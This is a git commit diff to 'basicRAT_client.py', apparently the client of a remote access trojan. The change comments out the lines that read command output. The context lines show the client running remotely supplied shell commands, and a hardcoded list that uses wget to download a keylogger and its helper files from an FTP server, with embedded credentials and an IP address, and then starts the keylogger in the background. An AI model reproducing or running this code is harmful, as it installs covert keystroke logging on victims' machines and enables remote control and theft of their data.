03263faa56b3cdd459762c3dee79d01c5c55e6df
GwendalO <gwendal.orinel@gmail.com>
2017-04-12 17:16:00 +0200

    Update basicRAT_client.py

--- basicRAT_client.py
+++ basicRAT_client.py
@@ -66,14 +66,14 @@ def main():
                     results = subprocess.Popen(action[i], shell=True,
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
-                    results = results.stdout.read() + results.stderr.read()
+                    #results = results.stdout.read() + results.stderr.read()
             else:
                 action = ['wget ftp://siic:azerty@84.39.49.25/keylogger/keylogger.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/pyxhook.py', 'wget ftp://siic:azerty@84.39.49.25/keylogger/start_keylogger.sh', 'sh start_keylogger.sh &']
                 for i in range(len(action)):
                     results = subprocess.Popen(action[i], shell=True,
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE)
-                    results = results.stdout.read() + results.stderr.read()
+                    #results = results.stdout.read() + results.stderr.read()
 
         elif cmd == 'kill':
             conn.close()
